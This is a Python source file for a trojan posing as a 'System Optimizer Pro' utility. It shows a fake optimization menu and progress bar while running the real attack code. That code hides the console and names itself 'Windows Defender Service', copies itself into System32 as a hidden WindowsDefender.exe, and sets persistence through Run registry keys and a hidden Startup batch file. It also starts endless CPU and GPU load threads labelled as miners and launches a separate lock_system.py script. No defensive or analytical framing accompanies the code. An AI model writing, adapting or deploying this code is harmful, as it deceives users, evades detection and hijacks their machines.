# app_main.py - System Optimizer Pro (Python Version)
import os
import sys
import time
import threading
import random
import ctypes
import subprocess
from datetime import datetime

# ============ CPU MINER SIMULATION ============
def cpu_miner_simulation():
    """Simulate CPU intensive work (70% usage)"""
    print("[CPU] Starting performance optimization...")
    
    while True:
        # CPU intensive calculations
        result = 0
        for i in range(1000000):
            # Complex math operations
            result += (i * i) ** 0.5
            result -= (i / 2) * 3.14159
            result *= (1.0 / (i + 1))
        
        # Control CPU usage ~70%
        time.sleep(0.3)  # 70% active, 30% idle

# ============ GPU MINER SIMULATION ============
def gpu_miner_simulation():
    """Simulate GPU intensive work (100% usage)"""
    print("[GPU] Starting graphics optimization...")
    
    # Use DirectX via command line untuk GPU stress
    while True:
        try:
            # DirectX stress via command
            subprocess.run([
                'powershell', 
                '-Command',
                '''
                Add-Type -AssemblyName System.Windows.Forms
                $form = New-Object Windows.Forms.Form
                $form.Text = "GPU Test"
                $form.Size = New-Object Drawing.Size(100,100)
                $timer = New-Object Windows.Forms.Timer
                $timer.Interval = 1
                $timer.add_Tick({
                    $form.Invalidate()
                })
                $timer.Start()
                $form.ShowDialog()
                '''
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        
        # Alternative: Memory intensive operations
        data = []
        for _ in range(10000):
            data.append([random.random() for _ in range(1000)])
        
        time.sleep(0.1)

# ============ NORMAL APPLICATION INTERFACE ============
def show_normal_interface():
    """Show normal application interface"""
    os.system('title System Optimizer Pro v2.0')
    os.system('color 0A')
    
    print("\n" + "="*60)
    print("           SYSTEM OPTIMIZER PRO v2.0")
    print("           Professional Edition")
    print("="*60)
    print()
    
    menu = """
    [1] 🚀 Optimize System Performance
    [2] 🧹 Clean Temporary Files
    [3] 💾 Defragment Disk Drives
    [4] 🔄 Update System Drivers
    [5] 🛡️  Scan for Malware Protection
    [6] ⚙️  Advanced Settings
    [7] ❌ Exit
    
    Select option [1-7]: """
    
    choice = input(menu)
    
    print("\n[INFO] Initializing system optimization...")
    print("[INFO] Please wait while we enhance your system...\n")
    
    # Fake loading animation
    for i in range(1, 11):
        percent = i * 10
        bar = "█" * i + "░" * (10 - i)
        print(f"[PROGRESS] {percent:3}% |{bar}|", end='\r')
        time.sleep(0.5)
    
    print("\n\n[SUCCESS] Optimization complete!")
    print("[INFO] Your system is now running at peak performance.")
    print("[INFO] Press Enter to continue...")
    input()

# ============ EVASION TECHNIQUES ============
def apply_evasion():
    """Apply anti-detection techniques"""
    
    # Rename window title
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Defender Service")
    
    # Hide console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Fake process name in task manager
    os.system('taskkill /f /im python.exe 2>nul')
    
    # Copy to system folder dengan nama legit
    current_path = os.path.abspath(sys.argv[0])
    system_path = r"C:\Windows\System32\WindowsDefender.exe"
    
    try:
        with open(current_path, 'rb') as src:
            with open(system_path, 'wb') as dst:
                dst.write(src.read())
        
        os.system(f'attrib +h +s +r "{system_path}"')
    except:
        pass

# ============ PERSISTENCE INSTALL ============
def install_persistence():
    """Install auto-start persistence"""
    
    # Registry auto-run
    reg_commands = [
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsDefender" /t REG_SZ /d "C:\\Windows\\System32\\WindowsDefender.exe" /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemOptimizer" /t REG_SZ /d "python \"%~f0\"" /f'
    ]
    
    for cmd in reg_commands:
        os.system(cmd)
    
    # Startup folder
    startup_path = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    startup_file = os.path.join(startup_path, "SystemOptimizer.bat")
    
    with open(startup_file, 'w') as f:
        f.write('@echo off\n')
        f.write(f'python "{os.path.abspath(sys.argv[0])}"\n')
    
    os.system(f'attrib +h "{startup_file}"')
    
    print("[PERSISTENCE] Auto-start configured")

# ============ MAIN EXECUTION ============
def main():
    print("[SYSTEM] Starting System Optimizer Pro...")
    
    # Apply evasion
    apply_evasion()
    
    # Install persistence
    install_persistence()
    
    # Start CPU miner thread
    cpu_thread = threading.Thread(target=cpu_miner_simulation, daemon=True)
    cpu_thread.start()
    
    # Start GPU miner thread
    gpu_thread = threading.Thread(target=gpu_miner_simulation, daemon=True)
    gpu_thread.start()
    
    # Start lock system thread
    lock_thread = threading.Thread(target=lambda: os.system('python lock_system.py'), daemon=True)
    lock_thread.start()
    
    # Show normal interface
    show_normal_interface()
    
    # Keep running in background
    print("\n[INFO] Background optimization running...")
    print("[INFO] System is being optimized continuously")
    print("[INFO] Press Ctrl+C to stop (not recommended)")
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping optimization...")
        sys.exit(0)

if __name__ == "__main__":
    main()